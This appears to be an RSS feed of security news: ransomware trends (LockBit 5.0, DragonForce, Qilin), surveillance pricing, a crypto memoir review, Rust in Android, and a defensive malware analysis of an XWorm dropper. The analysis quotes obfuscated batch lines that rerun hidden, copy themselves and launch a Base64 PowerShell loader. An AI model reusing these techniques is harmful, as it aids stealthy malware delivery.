By early September, the XSS administrator reported that LockBitSupp requested to be reinstated and opened the decision to a community vote.

_Figure 6 – XSS forum administrator polling members on whether to reinstate LockBitSupp._

Despite this effort, the vote ultimately failed, and LockBit remains banned from XSS.

_Figure 7 – Voting results on LockBitSupp’s proposed return to XSS._

In early September 2025, LockBit announced on RAMP the official launch of LockBit 5.0, coinciding with the sixth anniversary of the operation. New affiliates were asked to provide a Bitcoin deposit of roughly US $500 for access to a new encryptor and an updated control panel.

_Figure_ _8_ _– LockBit 5.0 affiliate registration screen._

Since that announcement, we identified more than 15 distinct victims affected by LockBit 5.0, which replaced the earlier 4.0 builds that were still active until April 2025. LockBit continues to enforce strict operational security: all affiliate interfaces require individualized credentials, and no victims have been publicly listed on the group’s data-leak site.

_Figure_ _9_ _– LockBit 5.0 ransom note from an attack in mid-September 2025_

Updated ransom notes now explicitly identify themselves as “LockBit 5.0” and include a unique personal identifier that allows each victim to access a private negotiation portal. Victims are typically granted a 30-day grace period before the stolen data is published.

_Figure_ _10_ _– Screenshot of LockBit 5.0 negotiations with a victim, mid-September 2025._

Analysis of the initial campaign shows that approximately 65 percent of identified attacks targeted organizations in the United States, with the remainder affecting Mexico, Indonesia, and several European countries.

LockBit 5.0 represents an upgraded evolution of the previous 4.0 version, incorporating Windows, Linux, and ESXi variants. The new build introduces enhanced evasion and anti-analysis mechanisms, faster encryption routines, and the use of a randomized 16-character file extension to disrupt signature-based detection. Most confirmed infections were deployed on Windows systems, while roughly 20 percent targeted ESXi virtual infrastructure.

Historically, LockBit has been among the most active and disruptive RaaS programs. With its extensive experience and the lower entry barrier for new affiliates, the re-emergence of the group poses a renewed risk to organizations across many sectors. The actions observed in September likely represent only the leading edge of a larger campaign, and the October victim postings on LockBit’s data-leak site are expected to confirm its full operational return.

DragonForce distinguishes itself among emerging ransomware groups through its heavy emphasis on public relations and coalition branding, frequently issuing high-profile statements and partnership claims on criminal forums. In September 2025, it announced on RAMP a supposed “coalition” with Qilin and LockBit, presented as a unified affiliate initiative.

However, these declarations appear largely symbolic, with no verified evidence of shared infrastructure or joint operations. The announcements likely serve to attract affiliates and project influence within a fragmented RaaS market. This reflects DragonForce’s broader strategy to maintain visibility and credibility in an increasingly competitive underground ecosystem.

_Figure_ _11_ _– DragonForce announcing updates and coalition with LockBit and Qilin._

DragonForce roughly tripled its monthly victim count since the shutdown of RansomHub and claimed 56 victims in Q3 2025. This is still fewer than Qilin and Akira but shows steady growth. DragonForce continues to actively recruit affiliates and promote new features in its RaaS program and recently announced on RAMP a data-driven extortion service that offers affiliates tailored analysis of stolen data to maximize ransom leverage.

_Figure_ _12_ _– DragonForce’s “data audit” services._

Under this model, an affiliate that accessed a large dataset (typically over 300 GB) from a company with annual revenues above US $15 million can submit it for analysis and maximize the extortion impact. In a recent showcased example, DragonForce reviewed stolen files from a gold mining company and highlighted the most valuable commercial and financial information, accompanied by a customized extortion letter.

_Figure_ _13_ _– DragonForce Audit example._

Qilin remains the most active ransomware group in 2025, increasing its monthly victim rate to an average of 75 victims in Q3, up from 36 in Q1.

Although the group presents itself as ideologically motivated, its operations appear entirely financially driven. In a June 2024 interview published on its WikiLeaksV2 blog, Qilin’s operators described themselves as “idealists who love our country.” This statement, however, contrasts sharply with the group’s broad and opportunistic targeting across sectors and geographies.

_Figure_ _14_ _– Qilin interview from June 2024 on their official blog._

In a separate interview on SuspectFile, a Qilin affiliate characterized the program as profit-focused and flexible, with affiliates responsible for intrusion and exfiltration while Qilin manages infrastructure, leak-site operations, and negotiations. Reported affiliate share ranges between 80% and 85%, which is among the highest in the market. This has attracted numerous operators previously active under RansomHub and BianLian.

Qilin’s open affiliate framework accommodates actors with diverse motivations and capabilities. In one recent case, the group’s data-leak site briefly listed Israel’s Shamir Medical Center among its victims.

_Figure_ _15_ _– Shamir Medical Center announcement on Qilin’s DLS._

According to Israeli researcher Erez Dassa, the responsible affiliate was likely an Iranian-linked threat actor. Dassa reported that following direct communication, Qilin’s administrators agreed that public association with terrorism or politically motivated activity could expose the group to additional pressure and subsequently removed the listing.

_Figure 16- Erez Dassa’s Telegram post explaining the Shamir incident._

This incident illustrates the range of motivations operating within large RaaS ecosystems. While affiliates enjoy broad autonomy, Qilin demonstrates a degree of central oversight and reputational management, removing politically sensitive cases that may jeopardize its long-term operations. The group continues to balance open recruitment and strategic control, maintaining its position as a leading and resilient RaaS brand.]]></content:encoded></item><item><title>The State of Ransomware – Q3 2025</title><link>https://research.checkpoint.com/2025/the-state-of-ransomware-q3-2025/</link><author>samanthar@checkpoint.com</author><category>threatintel</category><pubDate>Thu, 13 Nov 2025 14:33:49 +0000</pubDate><source url="https://research.checkpoint.com/">Check Point Research</source><content:encoded><![CDATA[Record fragmentation and decentralization: The number of active extortion groups in Q3 2025 rose to a record of 85 groups, the highest number observed to date.

The United States accounted for roughly half of all reported cases, reaffirming its position as the primary target for financially motivated threat actors. Most publicly listed victims remain concentrated in Western, developed economies, where organizations are perceived as having greater financial resources and a higher likelihood of paying ransom.Figure 14- Publicly Claimed Victims by Countries, Q3 2025.An unusual concentration of attacks in South Korea elevated the country to seventh place on the list of most affected nations this quarter. This spike is linked almost entirely to Qilin, which listed 30 South Korean victims, 28 of them between August and September 2025. Of these, 23 belonged to the financial services sector. While the cause of this focused campaign remains uncertain, the Korea Herald newspaper attributed it to a compromised cloud server operated by an IT contractor serving multiple mid-sized private equity funds.Safepay maintained a strong focus on Germany and the United Kingdom, with each accounting for approximately 10% of its total victims in Q3. Together with INC Ransom, which also recorded 11 British victims, these two groups were the most active in the UK, followed closely by Qilin with 10.Twenty percent of DragonForce’s victims were based in Germany, making it the most active ransomware group in the country.INC Ransom reported a notably high proportion of Canadian victims (8%), the largest share of any group targeting Canadian organizations this quarter.Figure 15- Canadian Victims by Actor, Q3 2025.Ransomware Attacks by Industry – Q3 2025 AnalysisThe industry distribution of ransomware victims in Q3 2025 shows a consistent cross-sector impact, largely unchanged from previous quarters. Profit-oriented organizations with high downtime costs, such as industrial manufacturing, and those holding sensitive or regulated data, such as business services, remained the most targeted sectors, each representing approximately 10% of all extortion attempts.Healthcare and medical organizations continue to face steady targeting due to the critical nature of their operations and the sensitivity of stored information. Interestingly, threat actors view these victims as high-risk targets because of the attention such incidents attract from law enforcement. In Q2 2025, healthcare accounted for approximately 8% of all publicly listed victims, a figure that remained stable through Q3.While some groups, such as Play Ransomware, appear to enforce an internal policy against attacking healthcare institutions, others such as Qilin, INC Ransomware, and KillSec continue to list healthcare providers among their victims, disregarding the informal ethical boundaries observed by larger RaaS brands. – Ransomware Victims by Industry, Q3 2025.The ransomware ecosystem in  remains highly active and structurally fragmented, while at the same time increasingly adaptive.

Think again. Your price might be different based on everything from your location to what you’ve looked at online. Companies often use algorithms to set their prices that rely heavily on customers’ personal data. Now, the state of New York is forcing companies to come clean when they set prices using customer data.Anyone using algorithms to adjust pricing for people in the state must now reveal when they’re doing it, thanks to legislation that the state began enforcing this week called the Algorithmic Pricing Disclosure Act.Algorithmic pricing is also known as “surveillance pricing” because it relies on using a person’s personal data to offer them promotional pricing (or potentially higher prices, if the vendor thinks they’ll pay).How software algorithms affect the prices you seeThe Federal Trade Commission (FTC) warned about this in a report that it released in January this year. It had ordered eight companies (Mastercard, Revionics, Bloomreach, JPMorgan Chase, Task Software, PROS, Accenture, and McKinsey) to disclose the services they offer that use algorithms and consumer data to set or recommend individualized prices, as well as the data inputs, customer lists and potential impact on consumer pricing. From the report:“A tool could be used to collect real-time information about a person’s browsing and transaction history and enable a company to offer—or not offer—promotions based on that consumer’s perceived affinity.” This data could include where they are, who they are, what they’re doing, and what they’ve done in the past. The report suggests that companies could use a wide variety of customer data to achieve these goals, including everything from their geolocation to what they’ve looked at on a particular website.For example, lingering over a particular item with their mouse or watching a certain percentage of a video on a website might alert companies that a consumer has a particular interest.The same data could be used to create “buckets” of customers with similar profiles (called “segments” in marketing) that companies could use to target people with different pricing.The FTC report had to use hypothetical examples, following push-back from the companies involved, but what it revealed was enlightening. A company might jack up prices of baby formula offered to a parent found searching for fast delivery, it said.In another imagined case, a person visiting a car dealership and using an in-store kiosk to explore vehicles might be segmented as a first-time car buyer, the report said. The store might decide that they’re inexperienced about the financing options available, affecting the rates that they’re offered.The FTC had issued a Request for Information (RFI) on the report, asking people for their own experiences of surveillance pricing. The public comment period was supposed to run until April 17, but the new FTC chair under the Trump administration, Andrew Ferguson, closed the RFI less than a week after the previous chair, Lina Khan, issued it.Last week the state’s Attorney General, Letitia James, effectively re-opened it—at least for New York residents. She issued a consumer alert urging residents to help enforce the law, which threatens a $1,000 penalty each time a company violates it. The alert encouraged people to report companies they believe are using algorithms to determine pricing.Under the New York law, businesses must display the exact text: “This price was set by an algorithm using your personal data.” They must display the text near the price shown, and they can’t use “protected class data” that is legally shielded from discrimination under the law. That includes ethnicity, national origin, disability, age, sex, sexual orientation, or gender identity. There are exceptions: insurance companies and other financial institutions are exempt under the Gramm-Leach-Bliley Act.A long history of algorithmic pricingAlgorithmic pricing has been happening for years. For example, in 2013 Staples was found to be adjusting prices for different people according to their distance from a rival’s store. The retailer reportedly charged higher prices for households with lower incomes, although whether this was intentional or just an unintended by-product of the algorithm isn’t clear. That’s the problem though: algorithms can easily have unexpected results.This pushback against surveillance pricing is spreading. California’s AB 325 bill amends the state’s Cartwright Act antitrust law to ban shared pricing algorithms that use competitor data between multiple businesses.

Nobody knew anything. The manufacturers didn’t know whether the cryptography they sold was any good. The customers didn’t know whether the crypto they bought was any good. Everyone pretended to know, thought they knew, or knew better than to even try to know. is the self-published memoirs of Fred Kinch. He was founder and vice president of—mostly sales—at a US cryptographic hardware company called Datotek, from company’s founding in 1969 until 1982. It’s mostly a disjointed collection of stories about the difficulties of selling to governments worldwide, along with descriptions of the highs and (mostly) lows of foreign airlines, foreign hotels, and foreign travel in general. But it’s also about encryption.Datotek sold cryptographic equipment in the era after rotor machines and before modern academic cryptography. The company initially marketed computer-file encryption, but pivoted to link encryption—low-speed data, voice, fax—because that’s what the market wanted.These were the years where the NSA hired anyone promising in the field, and routinely classified—and thereby blocked—publication of academic mathematics papers of those they didn’t hire. They controlled the fielding of strong cryptography by aggressively using the International Traffic in Arms regulation. Kinch talks about the difficulties in getting an expert license for Datotek’s products; he didn’t know that the only reason he ever got that license was because the NSA was able to break his company’s stuff. He had no idea that his largest competitor, the Swiss company Crypto AG, was owned and controlled by the CIA and its West German equivalent. “Wouldn’t that have made our life easier if we had known that back in the 1970s?” Yes, it would. But no one knew.Glimmers of the clandestine world peek out of the book. Countries like France ask detailed tech questions, borrow or buy a couple of units for “evaluation,” and then disappear again. Did they break the encryption? Did they just want to see what their adversaries were using? No one at Datotek knew.Kinch “carried the key generator logic diagrams and schematics” with him—even today, it’s good practice not to rely on their secrecy for security—but the details seem laughably insecure: four linear shift registers of 29, 23, 13, and 7 bits, variable stepping, and a small nonlinear final transformation. The NSA probably used this as a challenge to its new hires. But Datotek didn’t know that, at the time.Kinch writes: “The strength of the cryptography had to be accepted on trust and only on trust.” Yes, but it’s so, so weird to read about it in practice. Kinch demonstrated the security of his telephone encryptors by hooking a pair of them up and having people listen to the encrypted voice. It’s rather like demonstrating the safety of a food additive by showing that someone doesn’t immediately fall over dead after eating it. (In one absolutely bizarre anecdote, an Argentine sergeant with a “hearing defect” could understand the scrambled analog voice. Datotek fixed its security, but only offered the upgrade to the Argentines, because no one else complained. As I said, no one knew anything.)In his postscript, he writes that even if the NSA could break Datotek’s products, they were “vastly superior to what [his customers] had used previously.” Given that the previous devices were electromechanical rotor machines, and that his primary competition was a CIA-run operation, he’s probably right. But even today, we know nothing about any other country’s cryptanalytic capabilities during those decades.A lot of this book has a “you had to be there” vibe. And it’s mostly tone-deaf. There is no real acknowledgment of the human-rights-abusing countries on Datotek’s customer list, and how their products might have assisted those governments. But it’s a fascinating artifact of an era before commercial cryptography went mainstream, before academic cryptography became approved for US classified data, before those of us outside the triple fences of the NSA understood the mathematics of cryptography.This book review originally appeared in AFIO.]]></content:encoded></item><item><title>Rust in Android: move fast and fix things</title><link>http://security.googleblog.com/2025/11/rust-in-android-move-fast-fix-things.html</link><author>Edward Fernandez</author><category>security</category><pubDate>Thu, 13 Nov 2025 11:59:00 +0000</pubDate><source url="http://security.googleblog.com/">Google Security Blog</source><content:encoded><![CDATA[Last year, we wrote about why a memory safety strategy that focuses on vulnerability prevention in new code quickly yields durable and compounding gains. This year we look at how this approach isn’t just fixing things, but helping us move faster.

The 2025 data continues to validate the approach, with memory safety vulnerabilities falling below 20% of total vulnerabilities for the first time.
Updated data for 2025. This data covers first-party and third-party (open source) code changes to the Android platform across C, C++, Java, Kotlin, and Rust. This post is published a couple of months before the end of 2025, but Android’s industry-standard 90-day patch window means that these results are very likely close to final. We can and will accelerate patching when necessary.
We adopted Rust for its security and are seeing a 1000x reduction in memory safety vulnerability density compared to Android’s C and C++ code. But the biggest surprise was Rust's impact on software delivery. With Rust changes having  and spending 25% less time in code review, the safer path is now also the faster one. 

In this post, we dig into the data behind this shift and also cover:
How we’re expanding our reach: We're pushing to make secure code the default across our entire software stack. We have updates on Rust adoption in first-party apps, the Linux kernel, and firmware.Our first rust memory safety vulnerability...almost: We'll analyze a near-miss memory safety bug in unsafe Rust: how it happened, how it was mitigated, and steps we're taking to prevent recurrence. It’s also a good chance to answer the question “if Rust can have memory safety issues, why bother at all?”
Developing an operating system requires the low-level control and predictability of systems programming languages like C, C++, and Rust. While Java and Kotlin are important for Android platform development, their role is complementary to the systems languages rather than interchangeable. We introduced Rust into Android as a direct alternative to C and C++, offering a similar level of control but without many of their risks. We focus this analysis on new and actively developed code because our data shows this to be an effective approach.

When we look at development in systems languages (excluding Java and Kotlin), two trends emerge: a steep rise in Rust usage and a slower but steady decline in new C++.
Net lines of code added: Rust vs. C++, first-party Android code.This chart focuses on first-party (Google-developed) code (unlike the previous chart that included all first-party and third-party code in Android.) We only include systems languages, C/C++ (which is primarily C++), and Rust.
The chart shows that the volume of new Rust code now rivals that of C++, enabling reliable comparisons of software development process metrics. To measure this, we use the DORA framework, a decade-long research program that has become the industry standard for evaluating software engineering team performance. DORA metrics focus on:
Throughput: the velocity of delivering software changes.Stability: the quality of those changes.
Cross-language comparisons can be challenging. We use several techniques to ensure the comparisons are reliable.
Similar sized changes: Rust and C++ have similar functionality density, though Rust is slightly denser. This difference favors C++, but the comparison is still valid. We use Gerrit’s change size definitions.Similar developer pools: We only consider first-party changes from Android platform developers. Most are software engineers at Google, and there is considerable overlap between pools with many contributing in both.Track trends over time: As Rust adoption increases, are metrics changing steadily, accelerating the pace, or reverting to the mean? 
Code review is a time-consuming and high-latency part of the development process. Reworking code is a primary source of these costly delays. Data shows that Rust code requires fewer revisions. This trend has been consistent since 2023. Rust changes of a similar size need about 20% fewer revisions than their C++ counterparts.

In addition, Rust changes currently spend about 25% less time in code review compared to C++. We speculate that the significant change in favor of Rust between 2023 and 2024 is due to increased Rust expertise on the Android team.

While less rework and faster code reviews offer modest productivity gains, the most significant improvements are in the stability and quality of the changes.

Stable and high-quality changes differentiate Rust. DORA uses rollback rate for evaluating change stability. Rust's rollback rate is very low and continues to decrease, even as its adoption in Android surpasses C++.
For medium and large changes, the rollback rate of Rust changes in Android is ~4x lower than C++. This low rollback rate doesn't just indicate stability; it actively improves overall development throughput. Rollbacks are highly disruptive to productivity, introducing organizational friction and mobilizing resources far beyond the developer who submitted the faulty change. Rollbacks necessitate rework and more code reviews, can also lead to build respins, postmortems, and blockage of other teams. Resulting postmortems often introduce new safeguards that add even more development overhead.
In a self-reported survey from 2022, Google software engineers reported that Rust is both easier to review and more likely to be correct. The hard data on rollback rates and review times validates those impressions.

Historically, security improvements often came at a cost. More security meant more process, slower performance, or delayed features, forcing trade-offs between security and other product goals. The shift to Rust is different: we are significantly improving security  key development efficiency and product stability metrics. 

With Rust support now mature for building Android system services and libraries, we are focused on bringing its security and productivity advantages elsewhere. 
First-party applications: Rust is ensuring memory safety from the ground up in several security-critical Google applications, such as:Nearby Presence: The protocol for securely and privately discovering local devices over Bluetooth is implemented in Rust and is currently running in Google Play Services.MLS: The protocol for secure RCS messaging is implemented in Rust and will be included in the Google Messages app in a future release.Chromium: Parsers for PNG, JSON, and web fonts have been replaced with memory-safe implementations in Rust, making it easier for Chromium engineers to deal with data from the web while following the Rule of 2.These examples highlight Rust's role in reducing security risks, but memory-safe languages are only one part of a comprehensive memory safety strategy. We continue to employ a defense-in-depth approach, the value of which was clearly demonstrated in a recent near-miss.

We recently avoided shipping our very first Rust-based memory safety vulnerability: a linear buffer overflow in CrabbyAVIF. It was a near-miss. To ensure the patch received high priority and was tracked through release channels, we assigned it the identifier CVE-2025-48530. While it’s great that the vulnerability never made it into a public release, the near-miss offers valuable lessons. The following sections highlight key takeaways from our postmortem.
Scudo Hardened Allocator for the Win
A key finding is that Android’s Scudo hardened allocator deterministically rendered this vulnerability non-exploitabledue to guard pages surrounding secondary allocations. While Scudo is Android’s default allocator, used on Google Pixel and many other devices, we continue to work with partners to make it mandatory. In the meantime, we will issue CVEs of sufficient severity for vulnerabilities that could be prevented by Scudo.

In addition to protecting against overflows, Scudo’s use of guard pages helped identify this issue by changing an overflow from silent memory corruption into a noisy crash. However, we did discover a gap in our crash reporting: it failed to clearly show that the crash was a result of an overflow, which slowed down triage and response. This has been fixed, and we now have a clear signal when overflows occur into Scudo guard pages.
Unsafe Review and Training
Operating system development requires unsafe code, typically C, C++, or unsafe Rust  (for example, for FFI and interacting with hardware), so simply banning unsafe code is not workable. When developers must use unsafe, they should understand how to do so soundly and responsibly

To that end, we are adding a new deep dive on unsafe code to our Comprehensive Rust training. This new module, currently in development, aims to teach developers how to reason about unsafe Rust code, soundness and undefined behavior, as well as best practices like safety comments and encapsulating unsafe code in safe abstractions.

Better understanding of unsafe Rust will lead to even higher quality and more secure code across the open source software ecosystem and within Android. As we'll discuss in the next section, our unsafe Rust is already really quite safe. It’s exciting to consider just how high the bar can go.

This near-miss inevitably raises the question: "If Rust can have memory safety vulnerabilities, then what’s the point?"

The point is that the density is drastically lower. So much lower that it represents a major shift in security posture. Based on our near-miss, we can make a conservative estimate. With roughly 5 million lines of Rust in the Android platform and one potential memory safety vulnerability found (and fixed pre-release), our estimated vulnerability density for Rust is 0.2 vuln per 1 million lines (MLOC).

Our historical data for C and C++ shows a density of closer to 1,000 memory safety vulnerabilities per MLOC. Our Rust code is currently tracking at a density orders of magnitude lower: a more than 1000x reduction.
Memory safety rightfully receives significant focus because the vulnerability class is uniquely powerful and (historically) highly prevalent. High vulnerability density undermines otherwise solid security design because these flaws can be chained to bypass defenses, including those specifically targeting memory safety exploits. Significantly lowering vulnerability density does not just reduce the number of bugs; it dramatically boosts the effectiveness of our entire security architecture.

The primary security concern regarding Rust generally centers on the approximately 4% of code written within  blocks. This subset of Rust has fueled significant speculation, misconceptions, and even theories that unsafe Rust might be more buggy than C. Empirical evidence shows this to be quite wrong.

Our data indicates that even a more conservative assumption, that a line of unsafe Rust is as likely to have a bug as a line of C or C++, significantly overestimates the risk of unsafe Rust. We don’t know for sure why this is the case, but there are likely several contributing factors:
unsafe{} doesn't actually disable all or even most of Rust’s safety checks (a common misconception).The practice of encapsulation enables local reasoning about safety invariants.The additional scrutiny that unsafe{} blocks receive.
Historically, we had to accept a trade-off: mitigating the risks of memory safety defects required substantial investments in static analysis, runtime mitigations, sandboxing, and reactive patching. This approach attempted to move fast and then pick up the pieces afterwards. These layered protections were essential, but they came at a high cost to performance and developer productivity, while still providing insufficient assurance.

While C and C++ will persist, and both software and hardware safety mechanisms remain critical for layered defense, the transition to Rust is a different approach where the more secure path is also demonstrably more efficient. Instead of moving fast and  later fixing the mess, we can move faster  fixing things. And who knows, as our code gets increasingly safe, perhaps we can start to reclaim even more of that performance and productivity that we exchanged for security, all while also  security.

Good instinct—it was, and what we found inside was a surprisingly old trick hiding a modern threat.If the recipient had opened the attached Visual Basic Script () file, it would have quietly installed a remote-access Trojan known as Backdoor.XWorm. Once active, it could have let attackers:Steal files, passwords and other personal dataInstall other malware, including ransomwareEverything happens silently, with no alerts or windows. It’s built to avoid antivirus tools and hand over complete control of the PC.Please find attached the list of invoices we have processed and payment has been made as of 8/1/2025 2:45:06 a.m.Kindly review and confirm that these have been received on your end.Additionally, we would appreciate it if you could send us an updated list of any outstanding or unpaid invoices for our records.Looking forward to your response.The payload was identified by our research team as . XWorm is a known remote-access trojan (RAT) and backdoor used for spying, keylogging, stealing data, and even installing ransomware. It is sold as malware-as-a-service (MaaS), which means cybercriminals sell (or more often, rent) it to other criminals, who can then distribute and deploy it as they see fit while using the MaaS provider’s infrastructure to receive stolen data and maintain access through the backdoor.Why this email was suspiciousThe email itself had obvious warning signs: no names, just a generic “Hi” and a vague “Account Officer” signature. Real invoices or payment notices almost always include contact details, so this alone should raise suspicion.That attachment immediately stood out because  files are almost never used in business emails anymore. Visual Basic Script was a Windows automation tool from the late 1990s and 2000s—long since replaced by more versatile scripting languages like PowerShell.Today, almost every company blocks  attachments outright because they can execute code the moment you open them.So when one still gets through, it usually means either a security filter failed or an attacker deliberately tried to bypass it. In 2025, receiving a  “invoice” is like finding a floppy disk in your mailbox. It’s retro, suspicious, and definitely not something you should plug in.Double-check unexpected attachments: If you weren’t expecting it, confirm first using a known contact method, rather than by replying to the same email.Don’t open executable files: Anything ending in , , , or  can run code. Legitimate businesses don’t send these by email.I wanted to know exactly what that attachment did and how it worked. For our technical readers, here’s my deep dive down the wormhole.The message itself was straightforward—a short “invoice” note with a polite request to confirm payment and a  attachment named . Nothing about the text was overtly malicious, but the presence of a Visual Basic Script attachment immediately stood out. files are rarely, if ever, used in legitimate business correspondence anymore. Because they can execute code directly, most mail gateways block them outright. Seeing one arrive intact suggested either a configuration oversight or a deliberate attempt to bypass filtering.That alone made the sample worth a closer look.Using an Excel file with a malicious VBA macro often makes more sense from a criminal’s perspective than sending a plain  attachment. Excel files are common in business environments and can appear legitimate, making them less likely to raise suspicion than a raw script. Attackers also benefit because macro-enabled Office documents remain a frequent delivery mechanism. Many users and organisations still interact with these files and can be tricked into enabling macros for what seem like “legitimate” reasons.Microsoft has made macros harder to execute by default, so some threat actors have shifted tactics. Macros still work where social engineering succeeds, but attackers increasingly experiment with other vectors when they can’t rely on macros.Compared with an Excel document, a  attachment immediately stands out as unusual in modern business email and is often blocked by gateway rules. In this case, the sender may also have been counting on hidden file extensions () to make the file look like a harmless invoice; a small deception that still fools busy users.Although  is largely obsolete, it’s not harmless. Visual Basic Script can run arbitrary commands on Windows and can download or create additional malicious files. It’s crude, but it still works if it gets past filters or lands with an unaware user.I expected the code to be less-than-sophisticated, but only the first level was.The  dropped  into  (C:\Windows\Temp\IrisBud.bat) and invoked it via WMI. The  restarted itself in a way so it ran invisibly. The batch then copied itself to the user profile as  and contained heavy obfuscation. Its end goal was to run a PowerShell loader that read encoded strings from  and turn them into the real payload.Our team identified that payload as Backdoor.XWorm—a remote-access trojan (RAT) sold as malware-as-a-service. If executed, it would give attackers stealthy access to the machine: steal files and credentials, record keystrokes, install more malware, or deploy ransomware.The whole chain runs quietly and is designed to avoid detection. Simply opening the attachment would have put the user’s data at serious risk. If you have found Backdoor.XWorm on your machine, we advise you to follow the remediation and aftermath sections of this detection profile.The  file at first sight looked like alphabet soup, but the last line (of 429) provided the plan. I commented out that last line so  would create  but  execute it.However, my hopes of the batch file being easier to read were quickly run into the ground. Most of the batch file consisted of simple  commands which wrote almost everything ad verbatim into .But if you look closely you see a lot of repeated variables like  in the first line and  in line 30. I determined that these variables were not assigned a value and only there for “padding.” Padding is a technique used by malware authors to make their malicious programs harder to detect or analyze.Imagine you have a box with secret contents that you don’t want anyone to find easily. To hide what’s really inside, you fill the box with a lot of extra, useless material—like packing peanuts, shredded paper, or just empty space—so it’s difficult for someone to see or measure what’s actually important in the box.So, my first move was to get rid of all the padding. Although not perfect, that cleared some things up.The lineif not DEFINED Abc1 (set Abc1=1 & cmd /c start "" /min "%~dpnx0" %* & exit)is a classic malware technique to hide execution from the user while keeping the script running in the background. Let’s look at it step by step: — Checks if the variable  doesn’t exist yet. — Sets the variable to  (which marks that this check has been done).cmd /c start "" /min "%~dpnx0" %* — Restarts the batch file:
 runs a new command prompt starts a program minimized (invisible to the user) is the full path to the current batch file itself passes along any command-line arguments — Exits the current (visible) instanceSo, in other words the first time it runs:It restarts itself in a minimized/hidden window.The original visible instance exits immediately.The new hidden instance continues running with  set, so it won’t trigger this restart loop again.And this line:copy "%sourceFile%" "%userprofile%\aoc.bat" >nulis where the bat file copies itself to the user’s profile directory. — The source (set earlier to the current batch file’s full path). — The destination: the user’s profile directory (typically ) with the new name . — Suppresses output (hides the “1 file(s) copied” message).The setlocal enabledelayedexpansion is needed because exclamation marks () around variables are used for delayed variable expansion, which allows the batch script to update and use the value of variables dynamically within loops or code blocks where normal percent expansion wouldn’t work. This requires delayed expansion to be enabled which is done with the command setlocal enabledelayedexpansion.From the next lines I can tell that the  which we see can be replaced by the  command.Because it is defined by:set "xmgotoyfycqitjc=!ejlhixzkmttzgho!e!ugcqubmykdxgowp!"where earlier we saw:set "ejlhixzkmttzgho=s"set "ugcqubmykdxgowp=t"Together this makes xmgotoyfycqitjc = s + e + t so my next step was to replace all those instances. And with that we made a good start at mapping out all the variables that were not intended as padding.Of specific interest in this case was one particular line (414) where all the mapped variables came together.The only two other lines that stood out were two lines that begin with  and contain a very long string. While these superficially appear to be ordinary batch comments, they actually hide encrypted payload data (lines 41 and 69 are the hidden payload).We’ll get to those later on.First, we need to construct line 414 into something readable.After replacing all the defined variables, line 414 turned into this:Windows\System32\WindowsPowerShell\v1.0\powershell.exe-nop -c coding]::Unicode.GetString([Convert]::FromBase64String(('CgAkA…..{very_long_base64_encoded_string}…..AoA'.Replace('hkfdo','')))))The  command showed me that I had to remove even more padding—this time from the encoded PowerShell script which was padded with the  string.After I did that and decoded the base64 string, this was the PowerShell script:What this PowerShell script does explains why the two long lines I referred to earlier are needed:: the script looks for the hidden payload in  (the copy it created). The script reads  line by line, looking for lines that start with  (three colons). If it finds one, it treats everything after the colons as Base64-encoded data, decodes it, and runs it as PowerShell code. This is a way to hide malicious commands inside what looks like a batch file comment. creates the main malicious payload The big block (starting with ) does several things:Reads encrypted data from : It looks for a line starting with  (two colons) in the batch file, which contains encrypted and compressed malware. It uses AES encryption (with a hardcoded key and Initialization Vector (IV)) to decrypt the payload. Think of this like unlocking a safe with a specific combination. After decryption, it unzips the data using GZip compression. The malware was squeezed down to make it smaller and harder to detect.Loads and runs the malware: The decrypted/decompressed data turns out to be two executable files. The script loads these files directly into memory and runs them without ever saving them to disk. This is called a “fileless attack” and helps avoid anti-malware detection.By loading and running these malicious programs directly in memory, the attack avoids dropping visible files on disk, making it much harder for anti-malware solutions to spot or capture the real threat.To extract the payload safely I wrote a Python script to reproduce steps 1–3 without executing the code in memory. That produced two executable samples which I ran in an isolated sandbox.The sandbox revealed a mutex  which pointed to the XWorm family. “Mutex” stands for mutual exclusion, which is a special marker that a running program creates on a Windows computer to make sure only one copy of the process is running at once. Malware authors bake them into their code and security analysts catalog them, much like a “fingerprint.” So when our researchers see one of the known mutex names, they can easily classify the malware and move on to the next sample.

In 2024, 30% of breaches involved a third-party vendor, twice as much as the previous year.Static assessments are no longer enough. Questionnaire-based audits provide only outdated snapshots, leaving organizations blind to evolving threats between review cycles.Continuous, intelligence-led monitoring is essential. Real-time visibility into vendors’ external security posture enables faster detection, objective risk scoring, and proactive defense.Recorded Future’s Third-Party Intelligence closes the gap. By continuously tracking over 5 million organizations and 1 million technology products, it gives security teams the data-driven insight needed to stay ahead of emerging supply chain threats.The Modern Supply Chain: A Widening Attack SurfaceThe digital supply chain has undergone a profound transformation. What was once a small network of trusted vendors has evolved into a vast, interconnected web of technologies, platforms, and data flows.Cloud providers now host mission-critical infrastructure. SaaS platforms handle sensitive data. Managed service providers, subcontractors, and open-source libraries form the unseen backbone of daily operations. Each of these relationships expands the attack surface, introducing new dependencies and new vulnerabilities.A single vendor today may rely on dozens of others, each with its own third- and fourth-party relationships. The result is an ecosystem of thousands of potential ingress points, with many of them outside an organization’s direct line of sight. These dependencies are often invisible beyond the first tier, leaving businesses exposed to risks they may not even know exist.Cybercriminals understand this. Supply chain compromises have become a preferred strategy for attackers because infiltrating a vendor is often easier and more scalable than targeting an organization directly. By compromising one trusted connection, adversaries can pivot to dozens of downstream victims, often before the original breach is even detected.This expanding ecosystem demands a new approach. Securing the modern digital supply chain requires continuous, intelligence-led visibility, one that provides an external, real-time view of every partner and vendor’s security posture. Only with ongoing, data-driven insight can organizations uncover hidden exposures and detect emerging threats before small weaknesses become systemic failures.The Unavoidable Truth: Key Third-Party Risk Statistics for 2025Every year, the volume, cost, and complexity of vendor-related breaches continue to rise, exposing weaknesses that traditional risk management can’t contain. The following third-party risk statistics illustrate just how pervasive the problem has become and why a new approach is urgently needed.Third-party breaches are no longer isolated events. They are becoming a defining feature of the modern threat landscape.According to Verizon’s most recent Data Breach Investigations Report, 30% of breaches involved a third-party vendor, twice as much as the previous year. However, this figure is likely conservative due to underreporting and misclassification, especially when the compromise occurs several layers deep in their vendor ecosystem.According to IBM’s 2024 Cost of a Data Breach report, the average cost of a third-party breach is over $5.08 million. Highly regulated sectors such as healthcare and finance face even steeper costs.The true financial impact of a breach extends beyond the initial response, encompassing lost revenue, increased cyber insurance premiums, and reputational damage that drives customer churn. Organizations may also face expensive marketing and PR efforts to restore trust after a high-profile supply chain incident.Dwell time — the duration between initial compromise and detection — compounds these costs. In 2024, organizations with a dwell time beyond 200 days faced average breach costs of $5.01 million.Gartner research reveals that third-party breaches cost roughly 40% more to remediate than those that originate within an organization’s own systems, due to the additional complexity of managing incidents that span multiple entities, legal 